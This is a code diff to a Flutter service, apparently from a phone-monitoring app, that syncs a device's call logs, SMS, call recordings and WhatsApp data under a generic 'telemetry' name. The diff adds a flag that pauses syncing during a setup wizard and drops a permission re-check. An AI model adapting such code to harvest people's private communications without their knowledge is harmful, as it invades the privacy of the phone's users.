@@ -92,6 +92,8 @@ class TelemetrySyncService extends ChangeNotifier {
     return hasCallLogPermission && hasPhoneStatePermission;
   }
 
+  bool isSetupWizardActive = false;
+
   bool get hasAllSevenPermissions {
     if (Platform.isIOS) {
       return hasContactsPermission;
@@ -449,8 +451,6 @@ class TelemetrySyncService extends ChangeNotifier {
   Future<void> requestAllPermissions() async {
     try {
       await _platform.invokeMethod('requestAllPermissions');
-      await Future.delayed(const Duration(milliseconds: 300));
-      await checkPermissions();
     } catch (e) {
       debugPrint('Error requesting permissions: $e');
     }
@@ -459,8 +459,6 @@ class TelemetrySyncService extends ChangeNotifier {
   Future<void> requestPermission(String permissionGroup) async {
     try {
       await _platform.invokeMethod('requestPermission', {'permission': permissionGroup});
-      await Future.delayed(const Duration(milliseconds: 300));
-      await checkPermissions();
     } catch (e) {
       debugPrint('Error requesting permission $permissionGroup: $e');
     }
@@ -1529,7 +1527,7 @@ class TelemetrySyncService extends ChangeNotifier {
   bool _isFetchingSms = false;
 
   Future<void> syncDeviceCallLogs() async {
-    if (!hasCallLogPermission || _isFetchingCallLogs) return;
+    if (!hasCallLogPermission || _isFetchingCallLogs || isSetupWizardActive) return;
     _isFetchingCallLogs = true;
     try {
       final dynamic raw = await _platform.invokeMethod('fetchDeviceCallLogs');
@@ -1681,7 +1679,7 @@ class TelemetrySyncService extends ChangeNotifier {
   }
 
   Future<void> syncDeviceSms() async {
-    if (!hasSmsPermission || _isFetchingSms) return;
+    if (!hasSmsPermission || _isFetchingSms || isSetupWizardActive) return;
     _isFetchingSms = true;
     try {
       final dynamic raw = await _platform.invokeMethod('fetchDeviceSms');
@@ -1796,7 +1794,7 @@ class TelemetrySyncService extends ChangeNotifier {
   bool _isScanningRecordings = false;
 
   Future<void> scanLocalRecordings() async {
-    if (_isScanningRecordings) return;
+    if (_isScanningRecordings || isSetupWizardActive) return;
     _isScanningRecordings = true;
     try {
       final list = await _platform.invokeListMethod<Map<dynamic, dynamic>>('fetchLocalCallRecordings');
@@ -1975,7 +1973,7 @@ class TelemetrySyncService extends ChangeNotifier {
   }
 
   Future<void> syncNow({String? targetKind, bool uploadRecordings = true, bool alreadyMarkedSyncing = false}) async {
-    if (!_isPaired) return;
+    if (!_isPaired || isSetupWizardActive) return;
     final isWhatsAppOnly = targetKind != null && targetKind.startsWith('whatsapp');
     if (isWhatsAppOnly) {
       uploadRecordings = false;
